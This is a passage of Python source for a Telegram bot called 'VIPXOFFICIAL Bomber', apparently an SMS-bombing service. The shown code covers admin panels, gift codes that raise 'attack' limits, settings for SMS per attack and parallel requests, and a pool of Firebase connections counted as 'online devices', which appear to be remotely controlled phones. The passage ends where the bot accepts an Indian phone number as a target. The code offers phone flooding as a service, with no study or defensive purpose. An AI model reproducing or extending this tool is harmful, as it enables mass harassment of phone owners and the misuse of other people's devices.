            del user_states[user_id]
        return

    admin_type = get_admin_type(user_id)
    if admin_type is None:
        answer_callback(cb_id, "❌ Not authorized!", True)
        return
    
    if cb_data == "admin_panel_second":
        if admin_type != "second":
            answer_callback(cb_id, "❌ Not authorized!", True)
            return
        
        text = get_second_admin_panel_text(user_id)
        keyboard = make_kb([
            [btn("👥 Manage Users", callback_data="admin_users")],
            [btn("📢 Broadcast", callback_data="admin_broadcast")],
            [btn("📊 Statistics", callback_data="admin_stats"), btn("🎁 Gift Codes", callback_data="admin_gift_codes")],
            [btn("🔙 Back to Menu", callback_data="back_to_menu")]
        ])
        delete_message(chat_id, message_id)
        send_message(chat_id, text, reply_markup=keyboard)
        return
    
    if cb_data == "admin_panel":
        if admin_type != "owner":
            answer_callback(cb_id, "❌ Not authorized! Only owner can access full panel.", True)
            return
        
        settings = load_admin_settings()
        configs = load_firebase_configs()
        users = load_user_data()
        devices = load_device_cache()
        gift_codes = load_gift_codes()
        welcome_info = load_welcome_image_info()
        second_admins = load_second_admins()
        
        text = f"""👑 VIPXOFFICIAL Owner Admin Panel
==========================
📡 Firebase Connections: {len(configs)}
⚡ Online Devices: {len(devices.get('devices', []))}
👥 Total Users: {len(users)}
🎁 Gift Codes: {len(gift_codes)}
👥 Second Admins: {len(second_admins)}
📊 Daily Attack Limit: {settings.get('daily_attack_limit', 3)}
🎯 Max SMS Per Attack: {settings.get('max_sms_per_attack', 100)}
🔧 Maintenance Mode: {'ON' if settings.get('maintenance_mode', False) else 'OFF'}
📸 Welcome Image: {'✅ Set' if welcome_info.get('file_id') else '❌ Not Set'}
=========================="""
        keyboard = make_kb([
            [btn("👥 Manage Second Admins", callback_data="admin_second_admins")],
            [btn("📡 Manage Firebase", callback_data="admin_firebase")],
            [btn("👥 Manage Users", callback_data="admin_users"), btn("⚙️ Settings", callback_data="admin_settings")],
            [btn("🎁 Gift Codes", callback_data="admin_gift_codes"), btn("📢 Broadcast", callback_data="admin_broadcast")],
            [btn("📊 Statistics", callback_data="admin_stats"), btn("📸 Welcome Image", callback_data="admin_welcome_image")],
            [btn("🔄 Refresh Devices", callback_data="admin_refresh")],
            [btn("🔙 Back to Menu", callback_data="back_to_menu")]
        ])
        delete_message(chat_id, message_id)
        send_message(chat_id, text, reply_markup=keyboard)
        return

    if cb_data == "admin_back":
        delete_message(chat_id, message_id)
        if admin_type == "owner":
            settings = load_admin_settings()
            configs = load_firebase_configs()
            users = load_user_data()
            devices = load_device_cache()
            gift_codes = load_gift_codes()
            welcome_info = load_welcome_image_info()
            second_admins = load_second_admins()
            
            text = f"""👑 VIPXOFFICIAL Owner Admin Panel
==========================
📡 Firebase Connections: {len(configs)}
⚡ Online Devices: {len(devices.get('devices', []))}
👥 Total Users: {len(users)}
🎁 Gift Codes: {len(gift_codes)}
👥 Second Admins: {len(second_admins)}
📊 Daily Attack Limit: {settings.get('daily_attack_limit', 3)}
🎯 Max SMS Per Attack: {settings.get('max_sms_per_attack', 100)}
🔧 Maintenance Mode: {'ON' if settings.get('maintenance_mode', False) else 'OFF'}
📸 Welcome Image: {'✅ Set' if welcome_info.get('file_id') else '❌ Not Set'}
=========================="""
            keyboard = make_kb([
                [btn("👥 Manage Second Admins", callback_data="admin_second_admins")],
                [btn("📡 Manage Firebase", callback_data="admin_firebase")],
                [btn("👥 Manage Users", callback_data="admin_users"), btn("⚙️ Settings", callback_data="admin_settings")],
                [btn("🎁 Gift Codes", callback_data="admin_gift_codes"), btn("📢 Broadcast", callback_data="admin_broadcast")],
                [btn("📊 Statistics", callback_data="admin_stats"), btn("📸 Welcome Image", callback_data="admin_welcome_image")],
                [btn("🔄 Refresh Devices", callback_data="admin_refresh")],
                [btn("🔙 Back to Menu", callback_data="back_to_menu")]
            ])
            send_message(chat_id, text, reply_markup=keyboard)
        elif admin_type == "second":
            text = get_second_admin_panel_text(user_id)
            keyboard = make_kb([
                [btn("👥 Manage Users", callback_data="admin_users")],
                [btn("📢 Broadcast", callback_data="admin_broadcast")],
                [btn("📊 Statistics", callback_data="admin_stats"), btn("🎁 Gift Codes", callback_data="admin_gift_codes")],
                [btn("🔙 Back to Menu", callback_data="back_to_menu")]
            ])
            send_message(chat_id, text, reply_markup=keyboard)
        return

    if cb_data == "admin_stats":
        users = load_user_data()
        configs = load_firebase_configs()
        devices = load_device_cache()
        settings = load_admin_settings()
        gift_codes = load_gift_codes()
        total_sms = sum(u.get('total_sms_sent', 0) for u in users.values())
        total_attacks = sum(u.get('daily_attacks', 0) for u in users.values())
        premium_users = sum(1 for u in users.values() if u.get('is_premium', False))
        second_admins = load_second_admins()
        
        text = f"""📊 VIPXOFFICIAL Statistics

📡 Firebase Connections: {len(configs)}
⚡ Online Devices: {devices.get('total_online', 0)}
👥 Total Users: {len(users)}
👑 Premium Users: {premium_users}
🎁 Gift Codes: {len(gift_codes)}
👥 Second Admins: {len(second_admins)}
📨 Total SMS Sent: {total_sms}
🎯 Total Attacks: {total_attacks}

⚙️ Settings:
📊 Daily Limit: {settings.get('daily_attack_limit', 3)}
🎯 SMS Limit: {settings.get('max_sms_per_attack', 100)}
🔧 Maintenance: {'ON' if settings.get('maintenance_mode', False) else 'OFF'}

⏰ Last Update: {devices.get('last_update', 'Never')}"""
        keyboard = make_kb([[btn("🔙 Back to Admin", callback_data="admin_back")]])
        delete_message(chat_id, message_id)
        send_message(chat_id, text, reply_markup=keyboard)
        return

    if cb_data == "admin_users":
        users = load_user_data()
        text = f"👥 User Management\n\n"
        text += f"Total Users: {len(users)}\n\n"
        user_list = list(users.items())[-10:]
        for user_id, data in user_list:
            username = data.get('username', 'Unknown')
            sms_sent = data.get('total_sms_sent', 0)
            attacks = data.get('daily_attacks', 0)
            premium = "👑" if data.get('is_premium', False) else "🔰"
            text += f"{premium} {user_id} | {username} | 📨 {sms_sent} | 🎯 {attacks}\n"
        keyboard = make_kb([
            [btn("📊 View All Users", callback_data="admin_view_all_users")],
            [btn("🔙 Back to Admin", callback_data="admin_back")]
        ])
        delete_message(chat_id, message_id)
        send_message(chat_id, text, reply_markup=keyboard)
        return

    if cb_data == "admin_view_all_users":
        users = load_user_data()
        text = "👥 All Users\n\n"
        for i, (user_id, data) in enumerate(list(users.items())[:20], 1):
            username = data.get('username', 'Unknown')
            sms = data.get('total_sms_sent', 0)
            attacks = data.get('daily_attacks', 0)
            premium = "👑" if data.get('is_premium', False) else "🔰"
            text += f"{i}. {premium} {user_id} - {username}\n   📨 {sms} | 🎯 {attacks}\n"
        if len(users) > 20:
            text += f"\n... and {len(users) - 20} more users"
        keyboard = make_kb([[btn("🔙 Back", callback_data="admin_users")]])
        delete_message(chat_id, message_id)
        send_message(chat_id, text, reply_markup=keyboard)
        return

    if cb_data == "admin_broadcast":
        keyboard = make_kb([[btn("🔙 Back to Admin", callback_data="admin_back")]])
        settings = load_admin_settings()
        last_broadcast = settings.get('last_broadcast')
        delete_message(chat_id, message_id)
        send_message(chat_id,
            f"""📢 Broadcast Panel

Send a message to all users.

📝 Last Broadcast: {last_broadcast or 'Never'}

⚠️ Warning: This will send a message to ALL users.

Send /cancel to cancel.""",
            reply_markup=keyboard)
        return

    if cb_data == "admin_gift_codes":
        gift_codes = load_gift_codes()
        text = "🎁 Gift Codes Management\n\n"
        if not gift_codes:
            text += "No gift codes created yet.\n\n"
        else:
            for code, data in list(gift_codes.items())[:20]:
                used_status = "✅ Used" if data.get('is_used', False) else "🟢 Available"
                expiry = datetime.fromisoformat(data["expiry_date"])
                expiry_text = format_ist_datetime(expiry)
                text += f"🎫 {code}\n"
                text += f"   📊 Daily: {data['daily_attack_limit']} | 🎯 SMS: {data['max_sms_per_attack']}\n"
                text += f"   ⏳ Expiry: {expiry_text}\n"
                text += f"   📌 Status: {used_status}\n"
                if data.get('used_by'):
                    text += f"   👤 Used by: {data['used_by']}\n"
                text += "\n"
            if len(gift_codes) > 20:
                text += f"... and {len(gift_codes) - 20} more codes\n"
        keyboard = make_kb([
            [btn("➕ Create Gift Code", callback_data="admin_create_gift")],
            [btn("🔙 Back to Admin", callback_data="admin_back")]
        ])
        delete_message(chat_id, message_id)
        send_message(chat_id, text, reply_markup=keyboard)
        return

    if cb_data == "admin_create_gift":
        admin_states[user_id] = {"step": "gift_create"}
        keyboard = make_kb([[btn("🔙 Back to Gift Codes", callback_data="admin_gift_codes")]])
        delete_message(chat_id, message_id)
        send_message(chat_id,
            """🎁 Create Gift Code

Send the details in this format:
DAILY_LIMIT SMS_LIMIT EXPIRY_DAYS

Example:
10 300 30

This creates a code with:
📊 Daily Limit: 10 attacks
🎯 Max SMS: 300 per attack
⏳ Expires: 30 days

Type /cancel to cancel.""",
            reply_markup=keyboard)
        return

    if cb_data == "admin_second_admins":
        if admin_type != "owner":
            answer_callback(cb_id, "❌ Only owner can manage admins!", True)
            return
        
        second_admins = load_second_admins()
        text = f"""👥 Second Admin Management

Current Second Admins:
"""
        if second_admins:
            for admin_id in second_admins:
                text += f"\n🆔 {admin_id}"
                try:
                    resp = requests.get(f"{BASE_URL}/getChat", params={"chat_id": admin_id})
                    if resp.status_code == 200:
                        data = resp.json()
                        if data.get("ok"):
                            name = data["result"].get("first_name", "Unknown")
                            text += f" - {name}"
                except:
                    pass
        else:
            text += "\nNo second admins added yet."
        
        text += "\n\n📌 Commands for Owner:\n/addadmin [user_id] - Add second admin\n/removeadmin [user_id] - Remove second admin"
        
        keyboard = make_kb([
            [btn("➕ Add Admin", callback_data="admin_add_second")],
            [btn("➖ Remove Admin", callback_data="admin_remove_second")],
            [btn("🔙 Back to Admin", callback_data="admin_back")]
        ])
        delete_message(chat_id, message_id)
        send_message(chat_id, text, reply_markup=keyboard)
        return

    if cb_data == "admin_add_second":
        if admin_type != "owner":
            answer_callback(cb_id, "❌ Only owner can add admins!", True)
            return
        
        admin_states[user_id] = {"step": "add_second_admin"}
        keyboard = make_kb([[btn("🔙 Back to Admin", callback_data="admin_back")]])
        delete_message(chat_id, message_id)
        send_message(chat_id,
            """➕ Add Second Admin

Send the User ID of the person you want to add as Second Admin.

📌 Second Admin Access:
✅ Manage Users
✅ Broadcast
✅ Statistics
✅ Gift Codes

❌ Firebase Management
❌ Bot Settings
❌ Welcome Image
❌ Refresh Devices

Send /cancel to cancel.""",
            reply_markup=keyboard)
        return

    if cb_data == "admin_remove_second":
        if admin_type != "owner":
            answer_callback(cb_id, "❌ Only owner can remove admins!", True)
            return
        
        second_admins = load_second_admins()
        if not second_admins:
            keyboard = make_kb([[btn("🔙 Back", callback_data="admin_back")]])
            delete_message(chat_id, message_id)
            send_message(chat_id, "📭 No second admins to remove.", reply_markup=keyboard)
            return
        
        admin_states[user_id] = {"step": "remove_second_admin"}
        text = "➖ Remove Second Admin\n\nCurrent Second Admins:\n"
        for i, admin_id in enumerate(second_admins, 1):
            text += f"{i}. 🆔 {admin_id}\n"
        text += "\nSend the number of the admin to remove."
        
        keyboard = make_kb([[btn("🔙 Back", callback_data="admin_back")]])
        delete_message(chat_id, message_id)
        send_message(chat_id, text, reply_markup=keyboard)
        return

    if cb_data == "admin_refresh":
        if admin_type != "owner":
            answer_callback(cb_id, "❌ Only owner can refresh devices!", True)
            return
        
        progress_msg = send_message(chat_id, "🔄 Refreshing devices...\n⏳ Fetching online devices from all Firebase connections...\n\n⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜ 0%")
        msg_id = progress_msg.get("result", {}).get("message_id") if progress_msg and progress_msg.get("ok") else None
        def do_refresh():
            devices = fetch_all_online_devices()
            online_count = len(devices)
            cache = load_device_cache()
            cache["total_online"] = online_count
            cache["last_update"] = get_ist_now().isoformat()
            save_device_cache(cache)
            keyboard = make_kb([
                [btn("🔙 Back to Admin", callback_data="admin_back")],
                [btn("🔄 Refresh Again", callback_data="admin_refresh")]
            ])
            text = f"✅ Device Refresh Complete!\n\n⚡ Online Devices: {online_count}\n📡 Total Firebase Connections: {len(load_firebase_configs())}\n⏰ Last Updated: {get_ist_time_str()} IST\n\n✅ All devices have been refreshed successfully!"
            if msg_id:
                edit_message(chat_id, msg_id, text, reply_markup=keyboard)
            else:
                send_message(chat_id, text, reply_markup=keyboard)
        threading.Thread(target=do_refresh, daemon=True).start()
        return

    if cb_data == "admin_firebase":
        if admin_type != "owner":
            answer_callback(cb_id, "❌ Only owner can manage Firebase!", True)
            return
        
        configs = load_firebase_configs()
        text = "📡 Firebase Management\n\n"
        if not configs:
            text += "No Firebase connections configured.\n\n"
        else:
            display_count = min(20, len(configs))
            for i in range(display_count):
                config = configs[i]
                text += f"{i+1}. 🔗 {config.get('url', '')[:40]}...\n"
                text += f"   🔑 {config.get('key', '')[:15]}...\n"
                text += f"   📅 {config.get('added_at', 'Unknown')}\n\n"
            if len(configs) > 20:
                text += f"\n... and {len(configs) - 20} more connections\n"
                text += f"📝 Total: {len(configs)} connections\n"
        keyboard = make_kb([
            [btn("➕ Add Firebase", callback_data="admin_add_firebase")],
            [btn("📁 Bulk Add from .txt", callback_data="admin_bulk_add")],
            [btn("➖ Remove Firebase", callback_data="admin_remove_firebase")],
            [btn("🔄 Refresh All", callback_data="admin_refresh_firebase")],
            [btn("🔙 Back to Admin", callback_data="admin_back")]
        ])
        delete_message(chat_id, message_id)
        send_message(chat_id, text, reply_markup=keyboard)
        return

    if cb_data == "admin_add_firebase":
        if admin_type != "owner":
            answer_callback(cb_id, "❌ Only owner can add Firebase!", True)
            return
        
        keyboard = make_kb([[btn("🔙 Back to Firebase", callback_data="admin_firebase")]])
        delete_message(chat_id, message_id)
        send_message(chat_id,
            """📡 Add Firebase Connection

Send the Firebase URL and Key in this format:
URL KEY

Example:
https://your-project.firebaseio.com AIzaSy...

📌 Note: Bot will VERIFY the connection before adding.
- Valid ✅ → Added with active device count
- Invalid ❌ → Error message shown

Send /done when finished adding all Firebase connections.
Send /cancel to cancel.""",
            reply_markup=keyboard)
        return

    if cb_data == "admin_bulk_add":
        if admin_type != "owner":
            answer_callback(cb_id, "❌ Only owner can add Firebase!", True)
            return
        
        keyboard = make_kb([[btn("🔙 Back to Firebase", callback_data="admin_firebase")]])
        delete_message(chat_id, message_id)
        send_message(chat_id,
            """📁 Bulk Add Firebase

Send a .txt file with Firebase connections.
Each line should be in format:
URL KEY

Example:
https://your-project.firebaseio.com AIzaSy...
https://another-project.firebaseio.com secretkey

📌 Note: 
- Bot will VERIFY each connection before adding
- Only VALID connections will be added
- Shows active device count for each
- Invalid connections will show error in report
- Duplicates will be skipped
- You'll get a report file after processing

Send /cancel to cancel.""",
            reply_markup=keyboard)
        return

    if cb_data == "admin_remove_firebase":
        if admin_type != "owner":
            answer_callback(cb_id, "❌ Only owner can remove Firebase!", True)
            return
        
        configs = load_firebase_configs()
        if not configs:
            keyboard = make_kb([[btn("🔙 Back to Firebase", callback_data="admin_firebase")]])
            delete_message(chat_id, message_id)
            send_message(chat_id, "📭 No Firebase connections to remove.", reply_markup=keyboard)
            return
        admin_states[user_id] = {"step": "remove_firebase"}
        text = "📡 Select Firebase to remove:\n\n"
        display_count = min(30, len(configs))
        for i in range(display_count):
            config = configs[i]
            text += f"{i+1}. {config['url'][:40]}...\n"
        if len(configs) > 30:
            text += f"\n... and {len(configs) - 30} more\n"
        text += "\nSend the number of the connection to remove.\nSend /done when finished."
        delete_message(chat_id, message_id)
        send_message(chat_id, text)
        return

    if cb_data == "admin_refresh_firebase":
        if admin_type != "owner":
            answer_callback(cb_id, "❌ Only owner can refresh Firebase!", True)
            return
        
        delete_message(chat_id, message_id)
        send_message(chat_id, "🔄 Refreshing all Firebase connections...")
        threading.Thread(target=fetch_all_online_devices, daemon=True).start()
        return

    if cb_data == "admin_settings":
        if admin_type != "owner":
            answer_callback(cb_id, "❌ Only owner can change settings!", True)
            return
        
        settings = load_admin_settings()
        text = f"""⚙️ Settings Management

📊 Daily Attack Limit: {settings.get('daily_attack_limit', 3)}
🎯 Max SMS Per Attack: {settings.get('max_sms_per_attack', 100)}
🔧 Maintenance Mode: {'ON' if settings.get('maintenance_mode', False) else 'OFF'}
🚀 Parallel Requests: {settings.get('parallel_requests', 100)}

📝 Note: Changes affect all users unless they have premium.

Commands:
/setdaily [number] - Change daily limit
/setsms [number] - Change SMS limit
/setparallel [number] - Change parallel requests"""
        keyboard = make_kb([
            [btn("🔧 Toggle Maintenance", callback_data="admin_toggle_maintenance")],
            [btn("🔙 Back to Admin", callback_data="admin_back")]
        ])
        delete_message(chat_id, message_id)
        send_message(chat_id, text, reply_markup=keyboard)
        return

    if cb_data == "admin_toggle_maintenance":
        if admin_type != "owner":
            answer_callback(cb_id, "❌ Only owner can toggle maintenance!", True)
            return
        
        settings = load_admin_settings()
        settings["maintenance_mode"] = not settings.get("maintenance_mode", False)
        save_admin_settings(settings)
        status = "ON" if settings["maintenance_mode"] else "OFF"
        answer_callback(cb_id, f"✅ Maintenance: {status}", True)
        
        settings = load_admin_settings()
        text = f"""⚙️ Settings Management

📊 Daily Attack Limit: {settings.get('daily_attack_limit', 3)}
🎯 Max SMS Per Attack: {settings.get('max_sms_per_attack', 100)}
🔧 Maintenance Mode: {'ON' if settings.get('maintenance_mode', False) else 'OFF'}
🚀 Parallel Requests: {settings.get('parallel_requests', 100)}

📝 Note: Changes affect all users unless they have premium.

Commands:
/setdaily [number] - Change daily limit
/setsms [number] - Change SMS limit
/setparallel [number] - Change parallel requests"""
        keyboard = make_kb([
            [btn("🔧 Toggle Maintenance", callback_data="admin_toggle_maintenance")],
            [btn("🔙 Back to Admin", callback_data="admin_back")]
        ])
        delete_message(chat_id, message_id)
        send_message(chat_id, text, reply_markup=keyboard)
        return

    if cb_data == "admin_welcome_image":
        if admin_type != "owner":
            answer_callback(cb_id, "❌ Only owner can manage welcome image!", True)
            return
        
        welcome_info = load_welcome_image_info()
        text = f"""📸 Welcome Image Management

📷 Current Status: {'✅ Image Set' if welcome_info.get('file_id') else '❌ No Image Set'}
📝 Current Caption: 
{welcome_info.get('caption', 'No caption set')}

📌 How to change:
1. Send a photo to set as welcome image
2. Use /setwelcome [text] to change caption only

⚠️ Note: Image will be sent to new users when they start the bot."""
        keyboard = make_kb([
            [btn("📸 Upload Image", callback_data="admin_upload_welcome")],
            [btn("📝 Set Caption", callback_data="admin_set_welcome_caption")],
            [btn("🔄 Reset to Default", callback_data="admin_reset_welcome")],
            [btn("🔙 Back to Admin", callback_data="admin_back")]
        ])
        delete_message(chat_id, message_id)
        send_message(chat_id, text, reply_markup=keyboard)
        return

    if cb_data == "admin_upload_welcome":
        if admin_type != "owner":
            answer_callback(cb_id, "❌ Only owner can upload welcome image!", True)
            return
        
        keyboard = make_kb([[btn("🔙 Back to Welcome Image", callback_data="admin_welcome_image")]])
        delete_message(chat_id, message_id)
        send_message(chat_id,
            """📸 Upload Welcome Image

Send a photo to set as welcome image.
The image will be shown to new users.

Send /cancel to cancel.""",
            reply_markup=keyboard)
        return

    if cb_data == "admin_set_welcome_caption":
        if admin_type != "owner":
            answer_callback(cb_id, "❌ Only owner can set welcome caption!", True)
            return
        
        keyboard = make_kb([[btn("🔙 Back to Welcome Image", callback_data="admin_welcome_image")]])
        delete_message(chat_id, message_id)
        send_message(chat_id,
            """📝 Set Welcome Caption

Send the new caption for welcome image.
Use /setwelcome [text] command.

Example:
/setwelcome 🔥 Welcome to VIPXOFFICIAL Bomber!""",
            reply_markup=keyboard)
        return

    if cb_data == "admin_reset_welcome":
        if admin_type != "owner":
            answer_callback(cb_id, "❌ Only owner can reset welcome image!", True)
            return
        
        welcome_info = load_welcome_image_info()
        welcome_info["file_id"] = None
        welcome_info["caption"] = "🔥 Welcome to VIPXOFFICIAL Bomber!"
        save_welcome_image_info(welcome_info)
        answer_callback(cb_id, "✅ Welcome image reset to default!")
        
        welcome_info = load_welcome_image_info()
        text = f"""📸 Welcome Image Management

📷 Current Status: {'✅ Image Set' if welcome_info.get('file_id') else '❌ No Image Set'}
📝 Current Caption: 
{welcome_info.get('caption', 'No caption set')}

📌 How to change:
1. Send a photo to set as welcome image
2. Use /setwelcome [text] to change caption only

⚠️ Note: Image will be sent to new users when they start the bot."""
        keyboard = make_kb([
            [btn("📸 Upload Image", callback_data="admin_upload_welcome")],
            [btn("📝 Set Caption", callback_data="admin_set_welcome_caption")],
            [btn("🔄 Reset to Default", callback_data="admin_reset_welcome")],
            [btn("🔙 Back to Admin", callback_data="admin_back")]
        ])
        delete_message(chat_id, message_id)
        send_message(chat_id, text, reply_markup=keyboard)
        return

    answer_callback(cb_id, "Unknown action", True)

# ==================== MESSAGE HANDLERS ====================

def handle_message(message):
    chat_id = message.get("chat", {}).get("id")
    user_id = message.get("from", {}).get("id")
    text = message.get("text", "")
    message_id = message.get("message_id")
    document = message.get("document")
    photo = message.get("photo")

    if not chat_id or not user_id:
        return

    if text and text.startswith("/start"):
        handle_start(chat_id, user_id, message_id)
        return

    if text and text.startswith("/cancel"):
        if user_id in user_states:
            del user_states[user_id]
        if user_id in admin_states:
            del admin_states[user_id]
        keyboard = make_kb([[btn("🔙 BACK TO MENU", callback_data="back_to_menu")]])
        send_message(chat_id, "❌ Operation cancelled.", reply_markup=keyboard)
        return

    if text and text.startswith("/stop"):
        if user_id in user_states:
            del user_states[user_id]
        keyboard = make_kb([[btn("🔙 BACK TO MENU", callback_data="back_to_menu")]])
        send_message(chat_id, "🛑 Attack Stopped!", reply_markup=keyboard)
        return

    if text and text.startswith("/setwelcome"):
        if not is_admin(user_id):
            send_message(chat_id, "❌ Only owner can set welcome caption!")
            return
        caption = text.replace("/setwelcome", "", 1).strip()
        if caption:
            welcome_info = load_welcome_image_info()
            welcome_info["caption"] = caption
            save_welcome_image_info(welcome_info)
            send_message(chat_id, f"✅ Welcome caption updated!\n\nNew caption:\n{caption}")
        else:
            send_message(chat_id, "❌ Please provide a caption.\nUsage: /setwelcome Your caption here")
        return

    if is_admin(user_id):
        if text and text.startswith("/setdaily"):
            parts = text.split()
            if len(parts) == 2:
                try:
                    val = int(parts[1])
                    if 1 <= val <= 1000:
                        settings = load_admin_settings()
                        settings["daily_attack_limit"] = val
                        save_admin_settings(settings)
                        keyboard = make_kb([[btn("🔙 Back to Settings", callback_data="admin_settings")]])
                        send_message(chat_id, f"✅ Daily Attack Limit updated!\n\n📊 New Limit: {val} attacks per day", reply_markup=keyboard)
                    else:
                        send_message(chat_id, "❌ Daily limit must be between 1 and 1000.")
                except:
                    send_message(chat_id, "❌ Please enter a valid number.")
            else:
                send_message(chat_id, "❌ Usage: /setdaily [number]")
            return
        
        if text and text.startswith("/setsms"):
            parts = text.split()
            if len(parts) == 2:
                try:
                    val = int(parts[1])
                    if 1 <= val <= 10000:
                        settings = load_admin_settings()
                        settings["max_sms_per_attack"] = val
                        save_admin_settings(settings)
                        keyboard = make_kb([[btn("🔙 Back to Settings", callback_data="admin_settings")]])
                        send_message(chat_id, f"✅ Max SMS Per Attack updated!\n\n🎯 New Limit: {val} SMS per attack", reply_markup=keyboard)
                    else:
                        send_message(chat_id, "❌ SMS limit must be between 1 and 10000.")
                except:
                    send_message(chat_id, "❌ Please enter a valid number.")
            else:
                send_message(chat_id, "❌ Usage: /setsms [number]")
            return
        
        if text and text.startswith("/setparallel"):
            parts = text.split()
            if len(parts) == 2:
                try:
                    val = int(parts[1])
                    if 1 <= val <= 500:
                        settings = load_admin_settings()
                        settings["parallel_requests"] = val
                        save_admin_settings(settings)
                        keyboard = make_kb([[btn("🔙 Back to Settings", callback_data="admin_settings")]])
                        send_message(chat_id, f"✅ Parallel Requests updated!\n\n🚀 New Limit: {val} parallel requests", reply_markup=keyboard)
                    else:
                        send_message(chat_id, "❌ Parallel requests must be between 1 and 500.")
                except:
                    send_message(chat_id, "❌ Please enter a valid number.")
            else:
                send_message(chat_id, "❌ Usage: /setparallel [number]")
            return
        
        if text and text.startswith("/addadmin"):
            parts = text.split()
            if len(parts) == 2:
                try:
                    new_admin_id = int(parts[1])
                    second_admins = load_second_admins()
                    if new_admin_id in ADMIN_IDS:
                        send_message(chat_id, "❌ This user is already an Owner Admin!")
                        return
                    if new_admin_id in second_admins:
                        send_message(chat_id, "❌ This user is already a Second Admin!")
                        return
                    second_admins.append(new_admin_id)
                    save_second_admins(second_admins)
                    keyboard = make_kb([[btn("🔙 Back to Admin", callback_data="admin_back")]])
                    send_message(chat_id, f"✅ User {new_admin_id} added as Second Admin successfully!\n\n📌 They now have limited admin access.", reply_markup=keyboard)
                except:
                    send_message(chat_id, "❌ Please enter a valid User ID.")
            else:
                send_message(chat_id, "❌ Usage: /addadmin [user_id]")
            return
        
        if text and text.startswith("/removeadmin"):
            parts = text.split()
            if len(parts) == 2:
                try:
                    admin_id = int(parts[1])
                    second_admins = load_second_admins()
                    if admin_id not in second_admins:
                        send_message(chat_id, "❌ This user is not a Second Admin!")
                        return
                    second_admins.remove(admin_id)
                    save_second_admins(second_admins)
                    keyboard = make_kb([[btn("🔙 Back to Admin", callback_data="admin_back")]])
                    send_message(chat_id, f"✅ User {admin_id} removed from Second Admins!", reply_markup=keyboard)
                except:
                    send_message(chat_id, "❌ Please enter a valid User ID.")
            else:
                send_message(chat_id, "❌ Usage: /removeadmin [user_id]")
            return
        
        if text and text.startswith("/done"):
            if user_id in admin_states:
                del admin_states[user_id]
            send_message(chat_id, "✅ Operation completed!")
            return

    if user_id in admin_states:
        state = admin_states[user_id]
        step = state.get("step")

        if step == "gift_create":
            if not text:
                send_message(chat_id, "❌ Please send the gift code details.")
                return
            parts = text.split()
            if len(parts) == 3:
                try:
                    daily = int(parts[0])
                    sms = int(parts[1])
                    days = int(parts[2])
                    if daily < 1 or sms < 1 or days < 1:
                        send_message(chat_id, "❌ Values must be positive numbers.")
                        return
                    if daily > 10000 or sms > 100000 or days > 365:
                        send_message(chat_id, "❌ Values too high.")
                        return
                    gift_data = create_gift_code(daily, sms, days)
                    gift_codes = load_gift_codes()
                    gift_codes[gift_data["code"]] = gift_data
                    save_gift_codes(gift_codes)
                    del admin_states[user_id]
                    keyboard = make_kb([
                        [btn("🎁 View Gift Codes", callback_data="admin_gift_codes")],
                        [btn("🔙 Back to Admin", callback_data="admin_back")]
                    ])
                    expiry = datetime.fromisoformat(gift_data["expiry_date"])
                    send_message(chat_id,
                        f"✅ Gift Code Created Successfully!\n\n🎫 Code: `{gift_data['code']}`\n📊 Daily Limit: {daily} attacks\n🎯 Max SMS: {sms} per attack\n⏳ Expires: {format_ist_datetime(expiry)}\n\n📌 Send this code to users to redeem premium features.",
                        reply_markup=keyboard,
                        parse_mode="HTML")
                    return
                except ValueError:
                    send_message(chat_id, "❌ Invalid numbers. Use: DAILY SMS DAYS")
                    return
            else:
                send_message(chat_id, "❌ Format: DAILY SMS DAYS\nExample: 10 300 30")
                return

        if step == "remove_firebase":
            if not is_admin(user_id):
                send_message(chat_id, "❌ Only owner can remove Firebase!")
                return
            if not text:
                send_message(chat_id, "❌ Please send the number of the Firebase to remove.")
                return
            try:
                idx = int(text) - 1
                configs = load_firebase_configs()
                if 0 <= idx < len(configs):
                    removed = configs.pop(idx)
                    save_firebase_configs(configs)
                    threading.Thread(target=fetch_all_online_devices, daemon=True).start()
                    del admin_states[user_id]
                    keyboard = make_kb([[btn("🔙 Back to Firebase", callback_data="admin_firebase")]])
                    send_message(chat_id, f"✅ Firebase connection removed!\n\nURL: {removed['url']}", reply_markup=keyboard)
                    return
                else:
                    send_message(chat_id, "❌ Invalid number. Please enter a valid number from the list.")
                    return
            except ValueError:
                send_message(chat_id, "❌ Please enter a valid number.")
                return

        if step == "add_second_admin":
            if not is_admin(user_id):
                send_message(chat_id, "❌ Only owner can add admins!")
                return
            if not text:
                send_message(chat_id, "❌ Please send a User ID.")
                return
            try:
                new_admin_id = int(text.strip())
                second_admins = load_second_admins()
                if new_admin_id in ADMIN_IDS:
                    send_message(chat_id, "❌ This user is already an Owner Admin!")
                    return
                if new_admin_id in second_admins:
                    send_message(chat_id, "❌ This user is already a Second Admin!")
                    return
                second_admins.append(new_admin_id)
                save_second_admins(second_admins)
                del admin_states[user_id]
                keyboard = make_kb([[btn("🔙 Back to Admin", callback_data="admin_back")]])
                send_message(chat_id, f"✅ User {new_admin_id} added as Second Admin successfully!\n\n📌 They now have limited admin access.", reply_markup=keyboard)
                return
            except:
                send_message(chat_id, "❌ Please enter a valid User ID.")
                return

        if step == "remove_second_admin":
            if not is_admin(user_id):
                send_message(chat_id, "❌ Only owner can remove admins!")
                return
            if not text:
                send_message(chat_id, "❌ Please send a number.")
                return
            try:
                idx = int(text) - 1
                second_admins = load_second_admins()
                if 0 <= idx < len(second_admins):
                    removed = second_admins.pop(idx)
                    save_second_admins(second_admins)
                    del admin_states[user_id]
                    keyboard = make_kb([[btn("🔙 Back to Admin", callback_data="admin_back")]])
                    send_message(chat_id, f"✅ Second Admin {removed} removed successfully!", reply_markup=keyboard)
                    return
                else:
                    send_message(chat_id, "❌ Invalid number. Please enter a valid number from the list.")
                    return
            except ValueError:
                send_message(chat_id, "❌ Please enter a valid number.")
                return

    if user_id in user_states:
        state = user_states[user_id]
        step = state.get("step")

        if step == "target":
            if not text:
                send_message(chat_id, "❌ Please send a phone number.")
                return
            pattern = r'^\+?91?[6-9]\d{9}$|^[6-9]\d{9}$'
            if re.match(pattern, text):
                if not text.startswith("+"):
                    if text.startswith("91"):
                        target_number = f"+{text}"
                    else:
                        target_number = f"+91{text}"
                else:
                    target_number = text
                user_data = get_user_data(user_id)
                user_data = reset_daily_attacks_if_needed(user_data)
                can, msg = can_user_attack(user_data)
                if not can:
                    keyboard = make_kb([[btn("🔙 BACK", callback_data="back_to_menu")]])
                    send_message(chat_id, f"❌ {msg}\n\nPlease wait for reset or contact admin.", reply_markup=keyboard)
                    if user_id in user_states:
                        del user_states[user_id]
                    return
                user_states[user_id]["target"] = target_number
